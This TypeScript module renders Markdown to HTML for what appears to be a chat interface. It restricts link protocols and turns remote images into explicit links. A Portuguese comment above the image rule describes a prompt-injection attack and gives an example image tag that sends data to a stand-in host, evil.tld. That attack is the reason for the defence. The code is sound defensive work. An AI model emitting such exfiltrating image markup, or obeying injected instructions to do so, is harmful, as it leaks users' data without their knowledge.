import MarkdownIt from '../vendor/markdown-it.js';

export type MarkdownRenderResult = { html: string; fallback: false } | { html: string; fallback: true; error: string };

const escapeHtml = (value: string): string =>
  value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

function safeSource(value: unknown): string {
  try {
    return String(value ?? '');
  } catch {
    return '[Conteúdo Markdown inválido]';
  }
}

function normalizeSafeUrl(value: string, allowMailto: boolean): string | null {
  let raw = String(value || '').trim();
  if (!raw) return null;
  if (/^www\./i.test(raw)) raw = `https://${raw}`;
  try {
    const parsed = new URL(raw);
    const allowed = allowMailto ? ['http:', 'https:', 'mailto:'] : ['http:', 'https:'];
    return allowed.includes(parsed.protocol.toLowerCase()) ? parsed.toString() : null;
  } catch {
    return null;
  }
}

const markdown = new MarkdownIt({ html: false, linkify: true, breaks: false });

const defaultLinkOpen = markdown.renderer.rules.link_open;
markdown.renderer.rules.link_open = (tokens, index, options, env, self) => {
  const token = tokens[index];
  const hrefIndex = token.attrIndex('href');
  const rawHref = hrefIndex >= 0 ? token.attrs?.[hrefIndex]?.[1] : '';
  const safeHref = normalizeSafeUrl(String(rawHref || ''), true);
  if (!safeHref) {
    token.tag = 'span';
    token.attrs = [];
    token.meta = { ...(token.meta || {}), rejectedLink: true };
    return '<span>';
  }
  token.attrSet('href', safeHref);
  token.attrSet('target', '_blank');
  token.attrSet('rel', 'noopener noreferrer');
  return defaultLinkOpen
    ? defaultLinkOpen(tokens, index, options, env, self)
    : self.renderToken(tokens, index, options);
};

markdown.renderer.rules.link_close = (tokens, index, options, _env, self) => {
  let nestedLinks = 0;
  for (let cursor = index - 1; cursor >= 0; cursor -= 1) {
    if (tokens[cursor].type === 'link_close') {
      nestedLinks += 1;
      continue;
    }
    if (tokens[cursor].type !== 'link_open') continue;
    if (nestedLinks > 0) {
      nestedLinks -= 1;
      continue;
    }
    if (tokens[cursor].meta?.rejectedLink) return '</span>';
    break;
  }
  return self.renderToken(tokens, index, options);
};

// Imagens remotas NUNCA viram <img>: o navegador faria o GET sozinho, e uma página com prompt
// injection pode induzir o modelo a emitir ![x](https://evil.tld/?d=<dados>) para exfiltrar
// conteúdo sem nenhum clique. Vira link explícito (o usuário decide abrir).
markdown.renderer.rules.image = (tokens, index) => {
  const token = tokens[index];
  const src = normalizeSafeUrl(String(token.attrGet('src') || ''), false);
  const label = String(token.content || token.attrGet('alt') || '');
  if (!src) return escapeHtml(label);
  return `<a href="${escapeHtml(src)}" target="_blank" rel="noopener noreferrer">${escapeHtml(label || src)}</a>`;
};

markdown.renderer.rules.table_open = () => '<div class="markdown-table-scroll"><table>\n';
markdown.renderer.rules.table_close = () => '</table></div>\n';

markdown.core.ruler.after('inline', 'task_list_items', (state) => {
  for (let index = 0; index < state.tokens.length; index += 1) {
    const token = state.tokens[index];
    if (token.type !== 'inline' || state.tokens[index - 1]?.type !== 'paragraph_open') continue;
    if (state.tokens[index - 2]?.type !== 'list_item_open') continue;
    const match = token.content.match(/^\[([ xX])\]\s+/);
    if (!match) continue;
    token.content = token.content.slice(match[0].length);
    const firstText = token.children?.find((child) => child.type === 'text');
    if (firstText) firstText.content = firstText.content.replace(/^\[([ xX])\]\s+/, '');
    const checked = match[1].toLowerCase() === 'x';
    token.children?.unshift({
      type: 'html_inline',
      tag: '',
      attrs: null,
      map: null,
      nesting: 0,
      level: token.level,
      children: null,
      content: `<input class="task-list-checkbox" type="checkbox" disabled${checked ? ' checked' : ''}> `,
      markup: '',
      info: '',
      meta: null,
      block: false,
      hidden: false,
    } as never);
  }
});

export function renderMarkdownToHtml(source: string): MarkdownRenderResult {
  try {
    const normalized = String(source ?? '').replace(/\r\n?/g, '\n');
    return { html: markdown.render(normalized), fallback: false };
  } catch (error) {
    const plainText = safeSource(source);
    return {
      html: `<p>${escapeHtml(plainText).replace(/\n/g, '<br>')}</p>`,
      fallback: true,
      error: error instanceof Error ? error.message : String(error),
    };
  }
}
